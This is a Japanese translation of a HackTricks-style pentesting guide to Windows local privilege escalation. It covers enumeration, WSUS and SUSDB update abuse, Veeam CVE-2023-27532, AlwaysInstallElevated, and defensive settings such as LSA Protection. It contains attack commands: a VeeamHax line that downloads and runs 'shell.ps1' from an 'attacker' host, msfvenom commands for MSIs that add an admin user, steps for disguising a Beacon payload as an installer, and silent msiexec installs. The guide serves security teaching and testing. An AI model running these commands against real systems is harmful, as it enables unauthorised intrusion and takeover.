# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation のベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドに記載された一般的な Windows privilege escalation の手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows privilege escalation を扱った DerbyCon のプレゼンテーションが含まれています。<sup>[[5]](#references)</sup>

## Windows の基本理論

### Access Tokens

**Windows access tokens について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙を妨げたり**、実行ファイルの実行を阻止したり、さらには**活動を検知したり**する仕組みがいくつかあります。privilege escalation の列挙を始める前に、以下の**ページを読み**、これらの**防御機構をすべて列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインの UEFI NVRAM 編集を、起動前 DMA と Windows `SYSTEM` のメモリパッチ適用につなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレント昇格

`RAiLaunchAdminProcess` を通じて起動した UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass の手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティに関するレジストリ伝播は、任意の SYSTEM レジストリ書き込み (RegPwn) に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続を介して反射される、**SMB の任意ポート**を利用した LPE の経路も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください (適用済みのパッチも確認してください)。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別 Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が掲載されており、Windows環境が**非常に広い攻撃対象領域**を持つことがわかります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済み更新プログラム、該当する可能性のあるアドバイザリ候補を一覧表示します。結果が適用可能と判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル Exploit を使う場合は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windowsでは、32-bitプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32` は32-bitシステムディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bitプロセスでは使用できません。OSのビルドや未適用KBの候補だけでは、Exploitが可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、Exploitの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照らし合わせてください。

**システム情報を使ってローカルで確認**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGithubリポジトリ：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存されたcredentialやJuicyな情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell トランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、これを有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで一例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) では通常、各ユーザーの Documents フォルダーに書き込まれますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルを書き込むよう変更できます。トランスクリプトを確認する前に、実際の出力先とファイルの ACL を確認してください。コマンドの引数や出力内容（認証情報を含む場合があります）が記録されている可能性があります。トランスクリプトが読み取り可能でも、その内容から使用可能な高権限 ID が判明し、その ID で該当するコンテキストにログオンできる場合に限り、有力な手掛かりとなります。

### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログの直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティとその全内容が記録され、コードの各ブロックが実行時に確実に記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジック調査や悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な知見が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近の20件のイベントを表示するには、次のコマンドを使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がそのトラフィックを傍受または制御できるか、さらにクライアントの更新に関する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、以下を cmd で実行し、ネットワークが SSL なしの WSUS 更新を使用しているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell で以下を実行します:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信が返ってきた場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception の経路に必要な前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーでは該当する設定済み WSUS エンドポイントは選択されていません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、SSL で保護されていない WSUS 通信に「偽の」更新プログラムを注入する、weaponized な MiTM exploit スクリプトです。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する欠陥は次のとおりです。

> ローカルユーザーのプロキシ設定を変更でき、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自身の通信を intercept し、資産上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使うため、その証明書ストアも使用します。WSUS のホスト名に対する自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS 通信を intercept できます。WSUS は、証明書に対して trust-on-first-use 型の検証を実装する HSTS のような仕組みを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはそれを受け入れます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使って悪用できます。

### WSUS 管理者が制御する更新プログラム

現在の ID が WSUS サーバー上で更新プログラムを**公開および承認**できる場合、別の経路が存在します。サーバーの `WSUS Administrators` グループへの実効的な所属状況と委任された WSUS 権限を確認し、承認済みの更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限が必要であるとしています](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開コンテンツに対する信頼関係について説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使用された証明書を信頼する必要があります。これを権限昇格の経路と見なす前に、候補となる更新プログラムが署名され受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件が満たされているとは言えません。

### SUSDB のカスタム更新プログラムの悪用：`.txt`/`.esd` を介した署名なし payload

これは、HTTP WSUS 接続の interception とは異なる信頼境界の欠陥です。前提条件は、カスタム更新プログラムを公開および承認できるだけの **WSUS データベース（`SUSDB`）のストアドプロシージャへのアクセス権**です。実用的な侵入経路の一つは、上流 WSUS コンピューターアカウントを中継して、`SUSDB` をホストする別の MSSQL サーバーに接続する方法です。正確な前提条件は環境によって異なるため、SQL 管理者権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 から LDAP、SMB、または AD CS へ WSUS クライアント認証を中継する別の攻撃経路については、[WSUS HTTP を悪用した NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### 更新プログラムを作成、対象指定、承認する

カスタム更新プログラムのワークフローでは、正規の WSUS プロシージャを制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新プログラムのメタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済み XML フラグメント、拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツの digest を攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループに対するインストールを承認 | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、digest、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント全体で一致している必要があります。コンテンツ URL と対象グループを割り当てた後の最終的な承認処理は、次のようになります。例の GUID を再利用せず、新しい更新プログラム、グループ、デプロイの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子を利用した署名バイパス

WSUS は通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、渡されたファイル名の末尾が `.txt` または `.esd` の場合に証明書チェックフラグを false に設定します。これにより、バイト列がテキストまたは正規の ESD イメージであることを事前に確認することなく、`CheckCertificateSignature` がスキップされます。そのため、変更されていない PE を、たとえば `payload.exe.txt` という名前にすれば、コンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate` を呼び出すと、WSUS は登録済みのコンテンツを取得します。配信元は BITS の HTTP 要件を満たす必要があります。URL に到達できるだけでは不十分で、転送では最初に `HEAD`/`GET` を実行し、その後 byte-range リクエストを使用するためです。Range に対応していないサーバーでは、BITS に Range protocol header が必要であることを示す WSUS 同期エラー `EventId=364` が発生します。<sup>[[39]](#references)</sup>

調査用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、import/fragment/URL/group/deployment の一連の処理に必要な SQL を生成し、その SQL を実行するための改変版 MSSQL クライアントを含み、コンテンツのステージング用に `BitsWebServer.py` を同梱しています。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 未操作実行と再試行による永続化

クライアント側での動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。テストでは、更新が失敗または未完了のままになったpayloadは、コールバックプロセスの終了直後に再び提示されました。そのため、再試行の動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検出とハードニングの着眼点

この攻撃チェーンで役立つサーバー側およびクライアント側の着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` での `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新規のターゲティンググループ、外部コンテンツの配信元、`.txt`/`.esd` の更新payload、想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、誤記された `FileVerficationFailed`、および `EventId=364` を確認します。検証時には拡張子を鵜呑みにせず、payloadの拡張子とコンテンツのマジックナンバーを照合します。
- Windows Updateのインストールが繰り返し失敗・再試行されていないか、また `.txt` または `.esd` という名前のコンテンツからPEが実行されたり、想定外の子プロセスやネットワーク通信が発生したりしていないかを調査します。
- 対応している場合は、データベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスをWSUSサーバーと許可された管理システムに制限します。カスタム更新手順に対する `EXECUTE` 権限を最小限に抑え、監査します。

## サードパーティ製自動アップデーターとエージェントIPC（local privesc）

多くのエンタープライズエージェントは、localhostのIPCインターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正なルートCAを信頼するか、署名者の検証が弱い場合、ローカルユーザーは悪意あるMSIを送り込み、SYSTEMサービスにインストールさせることができます。一般化した手法（Netskope stAgentSvcの攻撃チェーン – CVE-2025-0309に基づく）については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401経由でSYSTEM）

Veeam Backup & ReplicationとCloud Connectは、デフォルトで **TCP/9401** 上のコアバックアップサービスを使用します。[Veeamのアドバイザリ](https://www.veeam.com/kb4424)には、バックアップネットワークの境界内で暗号化された構成データベースの認証情報が認証なしで漏えいする問題が記載されています。また、別の公開PoCでは、**NT AUTHORITY\SYSTEM** としてコマンドを実行する手法が示されています。<sup>[[12]](#references)</sup> サービスはlocalhost以外のアドレスにもバインドする可能性があるため、実際のアドレスとPIDを確認してください。

- **偵察**: TCP/9401が `Veeam.Backup.Service.exe` に属することを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりですが、完全なパッチ確認にはなりません。
- **修正済みバージョンの下限**: Veeamによると、最初の修正済みリリースは **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** で、それ以前のリリースは影響を受けます。4部構成のファイルバージョンだけでは、未パッチのベースビルドと、同じビルド番号に対する後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などのPoCを必要なVeeam DLLと同じディレクトリに配置し、ローカルソケット経由でSYSTEM payloadを実行します。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件が満たされる場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay は、適切な COM server が認証を行い、relay された主体が対象オブジェクトへの権限を持つ場合、低い権限のログオンから特権付きのディレクトリ書き込みへと至る可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みの両方が説明されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD の chain には、適用可能な委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential の chain には、key-credential の書き込み権限と、証明書認証の経路をサポートする KDC が必要です。いずれの経路も、ドメインに参加しているだけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオン種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わる可能性があります。緩いポリシーや一致する ACL は調査候補として扱い、受動的な列挙で COM coercion、relay 認証、ディレクトリ書き込みを引き起こさないでください。マシンアカウントの shadow credential はマシンチケットにつながる可能性があり、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限り、別途 DCSync の経路につながることがあります。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit を確認してください**

攻撃の流れの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリ設定が**有効**（値が **0x1**）の場合、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter sessionがある場合は、**`exploit/windows/local/always_install_elevated`**モジュールを使ってこの手法を自動化できます。

### PowerUP

power-upの`Write-UserAddMSI`コマンドを使うと、権限昇格用のWindows MSIバイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を求めるコンパイル済みMSIインストーラーを書き出します（そのため、GIUアクセスが必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行するだけで、privileges を昇格できます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、こちらのチュートリアルを参照してください。**コマンドライン**の**実行**だけが目的なら、「**.bat**」ファイルを wrapper にできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、新しい **Windows EXE TCP payload** を生成し、`C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例：**AlwaysPrivesc**）を入力し、場所に **`C:\privesc`** を指定して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- ファイルを選択するステップ 3/4 まで **Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルを**バックグラウンドで**インストールするには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 監査設定

これらの設定によって**ログに記録される内容**が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログがどこに送信されるかを把握しておくことが重要です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**は、ドメインに参加しているコンピューター上の**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意で、ランダムに生成され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL によって十分な権限を付与されたユーザーのみがアクセスできます。これにより、認可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによる **メモリの読み取り** やコードの挿入を **ブロック** して、システムのセキュリティをさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報について詳しくはこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限があるかどうかを確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、権限昇格のためにそれらを悪用する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページでは、**token**とは何かについて**詳しく説明しています**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いtoken**と、それを悪用する方法について確認してください。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
